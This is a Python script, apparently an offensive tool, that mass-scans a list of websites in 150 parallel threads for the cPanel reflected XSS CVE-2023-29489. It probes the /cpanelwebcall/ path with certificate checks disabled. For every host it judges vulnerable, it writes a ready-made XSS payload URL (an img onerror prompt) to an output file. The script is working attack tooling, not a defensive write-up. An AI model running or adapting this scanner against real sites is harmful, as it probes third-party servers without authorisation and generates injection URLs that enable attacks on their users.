import requests, sys, os, time, datetime, sys
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from colorama import *

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
pwd = os.getcwd()
listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]

def check(website):
    try: 
        if website.startswith("https://"):
            r = requests.get(website + "/cpanelwebcall/", verify=False, timeout=10)
        elif website.startswith("http://"):
            r = requests.get(website + "/cpanelwebcall/", verify=False, timeout=10)
        else:
            r = requests.get("https://" + website + "/cpanelwebcall/", verify=False, timeout=10)
        
        ff = open("CVE-2023-29489_Vuln.txt", "a+")
        if "HTTP error 400" in r.text:
            print(f"{Style.BRIGHT}\033[32m[x][  VULNERABLE  ] > \033[37m[" + website + "] [CVE-2023-29489]")
            ff.write(website + "/cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa\n")
        else:
            print(f"{Style.BRIGHT}\033[31m[!][   NOT VULN   ] > \033[37m[" + website + "]")
    except Exception as e:
        print(f"{Style.BRIGHT}\033[31m[!][NO CONNECTION ] > \033[37m[" + website + "]")
        
tod = Pool(150)
tod.map(check, op)
tod.close()
tod.join()
print("\n[+] Saved: {}/CVE-2023-29489_Vuln.txt".format(pwd))




